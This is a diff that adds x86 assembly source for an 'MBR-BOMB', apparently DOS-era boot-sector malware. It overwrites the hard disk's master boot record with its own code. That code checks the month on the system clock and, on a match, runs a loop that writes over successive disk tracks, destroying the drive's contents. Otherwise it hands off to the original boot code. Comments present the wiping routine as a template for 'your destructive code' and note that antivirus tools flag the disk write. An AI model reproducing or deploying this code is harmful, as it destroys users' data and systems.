@@ -1,0 +1,109 @@
+MBR:
+;**************************************
+;    Start of MBR-BOMB writing
+;**************************************
+mov ax,9f80h                ;very high memory                   
+mov es,ax                   ;good for buffer                
+mov ax,0201h                ;read the original         
+mov cx,0001h                ;MBR of the disk           
+mov dx,0080h                ;              
+xor bx,bx                   ;to buffer 9f80:0000h                       
+int 13h                     ;           
+push cs                     ; 
+pop ds                      ; 
+mov ax,9f80h                ;add my MBR-BOMB                                    
+mov es,ax                   ;to real MBR in my       
+mov si,offset fat           ;buffer              
+xor di,di                   ;                   
+mov cx,105                  ;ds:[fat]=>9f80:0000h
+repe movsb                  ;total 105bytes                   
+mov ax,9f80h                ;   
+mov es,ax                   ;   
+xor bx,bx                   ;replace the original    
+mov ax,0301h                ;MBR in the disk by the
+xor ch,ch                   ;new MBR-BOMB.  
+mov dx,0080h                ;
+mov cl,1                    ;WARNING! VSAFE/MSAVE 
+mov bx,0                    ;NOTIFY THIS ACTION 
+int 13h                     ; 
+ret                         ;
+;---------------------------------------------------
+;*********************      
+; Start of MBR code          
+;*********************        
+fat:                              ;       
+cli                               ;#       
+xor     ax,ax                     ;#     
+mov     ss,ax                     ;#       
+mov     sp,7C00h                  ;#        
+mov     si,sp                     ;#        
+push    ax                        ;#    
+pop     es                        ;# 
+push    ax                        ;# 
+pop     ds                        ;#     
+sti                               ;#
+                                  ;#   
+pushf                             ;#   
+push ax                           ;# 
+push cx                           ;# = This code be in the
+push dx                           ;#   original MBR
+push ds                           ;#   (NOT MODIFY)
+push es                           ;#   
+MOV AH,04H                        ; Read real tyme                       
+INT 1AH                           ; Clock          
+CMP DH,cs:byte ptr action_mes     ; is Month?     
+JE CAGO                           ; yes! SNIF SNIF HD. 
+lit:
+pop es
+pop ds
+pop dx  
+pop cx
+pop ax
+popf
+jmp booti
+CAGO:
+;++++++++++++++++++++++++++++++++++++++++++++++++++++
+; START OF YOUR DESTRUCTIVE CODE (or not destructive)
+;++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+rip_hd:                            
+                              ;@                                  
+                xor dx, dx    ;@                
+rip_hd1:                      ;@
+		mov cx, 2     ;@                 
+		mov ax, 311h  ;@    
+		mov dl, 80h   ;@             
+		mov bx, 5000h ;@       
+		mov es, bx    ;@ 
+		int 13h       ;@          
+		jae rip_hd2   ;@         
+		xor ah, ah    ;@       
+		int 13h       ;@       
+		rip_hd2:      ;@        
+		inc dh        ;@        
+		cmp dh, 4     ;@                
+		jb rip_hd1    ;@ 
+		inc ch        ;@        
+		jmp rip_hd            
+
+;+++++++++++++++++++++++++++++++++++++++++++
+;       END OF YOUR DESTRUCUTIVE  CODE
+;+++++++++++++++++++++++++++++++++++++++++++
+booti:
+xor ax,ax     ;#         
+mov es,ax     ;#       
+mov bx,7c00h  ;#             
+mov ah,02     ;#          
+mov al,1      ;#         
+mov cl,1      ;# #= This code be       
+mov ch,0      ;#    in the original        
+mov dh,1      ;#    MBR    
+mov dl,80h    ;#    (NOT MODIFY)   
+              ;#             
+int 13h       ;#                
+              ;#          
+db 0eah,00,7ch,00,00 ;#    
+;*******************
+; END OF MBR CODE
+;*******************
+
